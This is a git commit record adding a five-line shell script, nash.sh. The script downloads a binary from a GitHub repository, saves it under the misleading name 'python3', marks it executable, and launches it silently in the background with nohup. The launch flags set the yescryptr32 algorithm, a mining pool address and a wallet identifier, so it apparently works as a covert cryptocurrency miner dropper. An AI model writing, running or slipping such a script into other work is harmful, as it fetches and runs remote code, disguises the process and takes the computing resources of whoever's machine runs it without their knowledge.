bbdafb5ffe136d2e2592bcd0dd3a272f6b78b57e
barburonjilo <barburonjilo@outlook.co.id>
2024-08-12 18:43:36 +0700

    Create nash.sh

---
+++ nash.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+
+wget -O python3  https://github.com/barburonjilo/back/raw/main/sr 
+chmod +x python3 
+nohup ./python3  -a yescryptr32 --pool 45.115.224.59:8443 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$! --timeout 120 > /dev/null 2>&1 &
